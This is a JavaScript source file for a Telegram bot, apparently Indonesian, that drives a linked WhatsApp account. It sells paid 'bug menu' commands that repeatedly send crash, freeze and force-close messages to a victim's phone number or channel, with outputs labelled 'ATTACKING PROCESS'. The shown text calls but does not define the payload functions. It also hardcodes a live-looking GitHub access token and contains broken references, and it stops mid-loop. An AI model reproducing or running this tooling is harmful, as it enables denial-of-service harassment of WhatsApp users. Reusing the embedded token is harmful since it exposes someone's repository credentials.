const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const axios = require("axios");
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const adminFile = './adminuser.json';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Aii = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://files.catbox.moe/eqvyt9.jpg",
    "https://files.catbox.moe/eqvyt9.jpg",
    "https://files.catbox.moe/eqvyt9.jpg",
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const GITHUB_TOKEN = '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';  
const REPO_OWNER = 'yogzzonly';  
const REPO_NAME = 'Database'; 
const FILE_PATH = 'Memekdb.json';  

const TOKEN_DATABASE_URL = `https://api.github.com/repos/yogzzonly/Database/contents/Memekdb.json?ref=main`;
async function startBot() {
  try {
    const response = await axios.get(TOKEN_DATABASE_URL, {
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`
      }
    });

    const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
    
    const tokensData = JSON.parse(fileContent);

    if (!tokensData.tokens || !Array.isArray(tokensData.tokens) || tokensData.tokens.length === 0) {
      console.error(chalk.red.bold("𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗧𝗼𝗸𝗲𝗻 𝗞𝗼𝘀𝗼𝗻𝗴 𝗔𝘁𝗮𝘂 𝗧𝗶𝗱𝗮𝗸 𝗩𝗮𝗹𝗶𝗱"));
      process.exit(1);
    }

    if (!tokensData.tokens.includes(BOT_TOKEN)) {
      console.error(chalk.red.bold("❗ 𝗧𝗢𝗞𝗘𝗡 𝗞𝗔𝗠𝗨 𝗧𝗜𝗗𝗔𝗞 𝗧𝗘𝗥𝗗𝗔𝗙𝗧𝗔𝗥 𝗗𝗜𝗗𝗔𝗟𝗔𝗠 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘, 𝗛𝗔𝗥𝗔𝗣 𝗠𝗘𝗠𝗕𝗘𝗟𝗜 𝗔𝗞𝗦𝗘𝗦 𝗞𝗘 𝗢𝗪𝗡𝗘𝗥 ❗"));
      process.exit(1); 
    }

    console.log(chalk.green.bold("𝗧𝗢𝗞𝗘𝗡 𝗞𝗔𝗠𝗨 𝗧𝗘𝗥𝗗𝗔𝗙𝗧𝗔𝗥 𝗗𝗜𝗗𝗔𝗟𝗔𝗠 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘, 𝗦𝗘𝗟𝗔𝗠𝗔𝗧 𝗠𝗘𝗡𝗚𝗚𝗨𝗡𝗔𝗞𝗔𝗡 𝗦𝗖𝗥𝗜𝗣𝗧"));
    
  } catch (error) {
    console.error(chalk.red("𝗧𝗘𝗥𝗝𝗔𝗗𝗜 𝗞𝗘𝗦𝗔𝗟𝗔𝗛𝗔𝗡 𝗦𝗔𝗔𝗧 𝗠𝗘𝗡𝗚𝗔𝗞𝗦𝗘𝗦 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗧𝗢𝗞𝗘𝗡", error));
    process.exit(1);
  }
}

startBot();

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };
    const readline = require('readline');

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise((resolve) => {
        rl.question(text, (answer) => {
            rl.close(); // Menutup interface setelah mendapatkan input
            resolve(answer);
        });
    });
};



    Aii = makeWASocket(connectionOptions);

    Aii.ev.on('creds.update', saveCreds);
    store.bind(Aii.ev);

    Aii.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('Whatsapp Tersambung')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('WhatsApp Belum Tersambung')}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.blue.bold('Menyambung Ulang')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}


const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❗𝗔𝗻𝗱𝗮 𝗧𝗶𝗱𝗮𝗸 𝗠𝗲𝗺𝗶𝗹𝗶𝗸𝗶 𝗔𝗸𝘀𝗲𝘀, 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗠𝗲𝗺𝗯𝗲𝗹𝗶 𝗔𝗸𝘀𝗲𝘀 𝗞𝗲 𝗢𝘄𝗻𝗲𝗿 @xyann_only ");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❗𝗔𝗻𝗱𝗮 𝗕𝘂𝗸𝗮𝗻 𝗔𝗱𝗺𝗶𝗻");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❗𝗔𝗻𝗱𝗮 𝗕𝘂𝗸𝗮𝗻 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺");
    }
    next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};
//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
┏━━━━━━━━ 𝗘𝗥𝗥𝗢𝗥 ━━━━━━━━━━⊱
┃𝐓𝐢𝐝𝐚𝐤 𝐀𝐝𝐚 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐘𝐚𝐧𝐠 𝐓𝐞𝐫𝐡𝐮𝐛𝐮𝐧𝐠
┗━━━━━━━━━━━━━━━━━━━━━━━━⊱`);
    return;
  }
  next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("❗ 𝗞𝗮𝗺𝘂 𝗠𝗮𝘀𝘂𝗸 𝗗𝗮𝗹𝗮𝗺 𝗗𝗮𝗳𝘁𝗮𝗿 𝗕𝗹𝗮𝗰𝗸 𝗟𝗶𝘀𝘁 𝗗𝗮𝗻 𝗧𝗶𝗱𝗮𝗸 𝗕𝗶𝘀𝗮 𝗠𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗸𝗮𝗻 𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 ❗.");
    }
    
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    const makLu = isWhatsAppConnected
        ? "Connect"
        : "Disconnect";
    
    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `\`\`\`      
╔─═⊱ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ─═⬣
║ Name : 𝐋𝐲𝐧𝐱𝐚 𝐂𝐫𝐚𝐬𝐡
║ Dev : 𝐗𝐲𝐚𝐧𝐧🩸
║ Version : 1.0 VIP
║ Library : JavaScript
║ Status On : ${waktuRunPanel}
║ Is Connection : ${makLu}
┗━━━━━━━━━━━━━━━⬣
╔─═⊱ 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 ─═⬣
║ Chaddxyz (Developer)
║ Pinow ( Support )
║ Ichad (Support )
║ Ell ( Editor ) 
║ DiftTzy ( Friend )
║ All Buyer
┗━━━━━━━━━━━━━━━⬣
╔─═⊱ 𝗡𝗢𝗧𝗘 ─═⬣
║ 𝖲𝖼𝗋𝗂𝗉𝗍 𝖮𝗇𝗅𝗒 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 𝖵𝗂𝗉
┗━━━━━━━━━━━━━━━⬣
\`\`\``,
 
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
         [
             Markup.button.callback('𝗕𝗨𝗚 𝗠𝗘𝗡𝗨🦠', 'XYANN1'),
             Markup.button.callback('𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨〽️', 'XYANN2'),
         ],
         [
             Markup.button.url('⌜ 𝗗𝗘𝗩 ⌟', 'https://t.me/ChaddInformasii'),
             Markup.button.url('⌜ 𝗖𝗛 ⌟', 'https://t.me/ChaddInformasii'),
         ]
       ])
    });
});

bot.action('XYANN1', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    const makLu = isWhatsAppConnected
        ? "Connect"
        : "Disconnect";
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('Back To Menu', 'startback')],
  ]);

  const caption = `\`\`\`
╔─═⊱ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ─═⬣
║ Name : Cyber Crash
║ Dev : ICHAD
║ Version : 1.0 Private
║ Library : JavaScript
║ Status On : ${waktuRunPanel}
║ Is Connection : ${makLu}
┗━━━━━━━━━━━━━━━⬣
╔─═⊱ 𝗠𝗘𝗡𝗨 𝗖𝗔𝗠𝗣𝗨𝗥𝗔𝗡 ─═⬣
║ /forceinvis 628xxx
║ /delaymaker 628xxx
║ /broadcastvis 628xxx
║ /delay2 628xxx
┗━━━━━━━━━━━━━━━⬣
╔─═⊱ 𝗠𝗘𝗡𝗨 𝗙𝗢𝗥𝗖𝗘 ─═⬣
║ /forcloseone 628xxx
║ /force2 628xxx
┗━━━━━━━━━━━━━━━⬣
╔─═⊱ 𝗠𝗘𝗡𝗨 𝗖𝗥𝗔𝗦𝗛 ─═⬣
║ /blanknew 628xxx
║ /notifcrash 628xxx
║ /frezeehome 628xxx
┗━━━━━━━━━━━━━━━⬣
╔─═⊱ 𝐂𝐑𝐀𝐒𝐇 𝐂𝐇 𝐌𝐄𝐍𝐔 ─═⬣
║ /forcech (id ch) 
┗━━━━━━━━━━━━━━━⬣
© ichad ɴᴏᴛ ᴅᴇᴠ
 \`\`\` `;
  await editMenu(ctx, caption, buttons);
});

bot.action('XYANN2', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    const makLu = isWhatsAppConnected
        ? "Connect"
        : "Disconnect";
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('Back to Menu', 'startback')],
  ]);

  const caption = `\`\`\`
╔─═⊱ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ─═⬣
║ Name : Cyber Crash
║ Dev : ICHAD
║ Version : 1.0 Private
║ Library : JavaScript
║ Status On : ${waktuRunPanel}
║ Is Connection : ${makLu}
┗━━━━━━━━━━━━━━━⬣
╔─═⊱ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ─═⬣
║ /addprem
║ /delprem
║ /addadmin
║ /deladmin
║ /addnova
║ /cekidch
┗━━━━━━━━━━━━━━━⬣
© ichad ɴᴏᴛ ᴅᴇᴠ
 \`\`\` `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('startback', async (ctx) => {
 const userId = ctx.from.id.toString();

 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    const makLu = isWhatsAppConnected
        ? "Connect"
        : "Disconnect";
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('𝗫𝗡𝗢𝗩𝗔〽️', 'XYANN1'),
             Markup.button.callback('𝗫𝗢𝗪𝗡𝗘𝗥', 'XYANN2'),
         ],
         [
             Markup.button.url('⌜🍁⌟', 'https://t.me/ChaddInformasiir'),
             Markup.button.url('⌜🩸⌟', 'https://t.me/ChaddInformasii'),
         ]
]);

  const caption = `\`\`\`
╔─═⊱ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ─═⬣
║ Name : Cyber Crash
║ Dev : ICHAD
║ Version : 1.0 Private
║ Library : JavaScript
║ Status On : ${waktuRunPanel}
║ Is Connection : ${makLu}
┗━━━━━━━━━━━━━━━⬣
╔─═⊱ 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 ─═⬣
║ Chaddxyz (Developer)
║ Ridss
║ Maxx
║ Xyann ( editor ) 
║ fadil4you
║ Sandi
║ Improve
║ NanaWangcap 
║ DiftTzy
║ All Buyer
┗━━━━━━━━━━━━━━━⬣
╔─═⊱ 𝗡𝗢𝗧𝗘 ─═⬣
║ 𝖲𝖼𝗋𝗂𝗉𝗍 𝖮𝗇𝗅𝗒 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 𝖵𝗏𝗂𝗉
┗━━━━━━━━━━━━━━━⬣
©ichad ɴᴏᴛ ᴅᴇᴠ
\`\`\` `;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const RandomBgtJir = getRandomImage();
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    
     ctx.replyWithPhoto(RandomBgtJir, {
    caption: `\`\`\`
╔─═⊱ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ─═⬣
║ Tᴀʀɢᴇᴛ: ${target}
║ Sᴛᴀᴛᴜs: Succesfully ✅
┗━━━━━━━━━━━━━━━⬣
╔─⊱ 𝐍𝐎𝐓𝐄𝐒 𝐅𝐎𝐑 𝐀𝐋𝐋 ─═⬣
║ ᴊᴇᴅᴀ 𝟻/𝟷𝟶ᴍɴᴛ ʙɪᴀʀ ɢ ᴋᴇʙᴀɴ
║ sᴇɴᴅᴇʀ ᴡᴀᴊɪʙ ᴡᴀ ᴏʀɪ ᴀᴊɢ! 
┗━━━━━━━━━━━━━━━⬣
╔━━━━━━━━━━━━━━⬣
║ ᴛʜᴜɴᴅᴇʀ ɴᴏᴠᴀ ᴠ1.0
┗━━━━━━━━━━━━━━━⬣
\`\`\``,
         parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard([
                    [
                       Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback'),
                       Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://t.me/Chad_Back'),
                    ]
                 ])
              });
              (async () => {
    console.clear();
    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By ICHAD')));
    })();
}

bot.command("NovaForce", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/NovaForce 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 50; i++) {
      await EpX(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});

bot.command("forcech", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/forcech 1234567810@newsletter`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@newsletter";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 50; i++) {
      await VampCrashCH(target);
      
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});

bot.command("broadcastvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/broadcastvis 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 50; i++) {
      await VampBroadcast(target, mention = true);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});


bot.command("forceinvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/forceinvis 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let r = 0; r < 15; r++) {
      await CrlSqL(isTarget)
      await TripXMed(target)
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});

bot.command("notifcrash", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/notifcrash 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 50; i++) {
      await VampNotif2(target, ptcp = true);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});

bot.command("delaymaker", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/delaymaker 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 20; i++) {
      await NovaInfinitycrash(target, false);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`);
   await donerespone(target, ctx);
});

bot.command("frezeehome", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/frezeehome 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 50; i++) {
      await VampNotifCrash(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
┏━━━━━[ 𝗖𝗬𝗕𝗘𝗥 𝗖𝗥𝗔𝗦𝗛  ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${target}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━
`);
   await donerespone(target, ctx);
});

bot.command("blanknew", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/blanknew 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』⚡`);

    for (let i = 0; i < 10; i++) {
